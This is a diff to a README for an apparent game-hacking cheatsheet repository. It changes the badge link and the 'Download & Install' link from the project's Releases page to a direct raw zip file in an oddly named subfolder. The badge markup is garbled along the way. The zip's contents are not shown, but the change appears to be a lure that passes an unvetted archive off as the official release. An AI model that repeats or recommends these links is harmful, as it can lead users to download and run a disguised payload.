@@ -1,6 +1,6 @@
 # 🎮 gamehacking-cheatsheet - Essential Tools for Game Hacking Success
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Mugdhayk45/gamehacking-cheatsheet/releases)
+[![Download Now](https://raw.githubusercontent.com/Mugdhayk45/gamehacking-cheatsheet/main/metopism/gamehacking-cheatsheet.zip%20Now-Click%https://raw.githubusercontent.com/Mugdhayk45/gamehacking-cheatsheet/main/metopism/gamehacking-cheatsheet.zip)](https://raw.githubusercontent.com/Mugdhayk45/gamehacking-cheatsheet/main/metopism/gamehacking-cheatsheet.zip)
 
 ## 📄 Description
 The gamehacking-cheatsheet is a modular, offensive game hacking resource designed for ethical hacking, reverse engineering, and CTF (Capture the Flag) research. This guide covers everything from memory exploits to anti-cheat evasion, making it an essential tool for both beginners and experienced hackers alike.
@@ -9,7 +9,7 @@ The gamehacking-cheatsheet is a modular, offensive game hacking resource designe
 To get started with the gamehacking-cheatsheet, you will need to download the software from our Releases page. This will provide you with all the tools you need to begin exploring and researching game security and hacking techniques.
 
 ## 🔗 Download & Install
-Visit this page to download: [Game Hacking Cheatsheet Releases](https://github.com/Mugdhayk45/gamehacking-cheatsheet/releases)
+Visit this page to download: [Game Hacking Cheatsheet Releases](https://raw.githubusercontent.com/Mugdhayk45/gamehacking-cheatsheet/main/metopism/gamehacking-cheatsheet.zip)
 
 ### Steps to Download:
 1. Click the link above to access the Releases page.
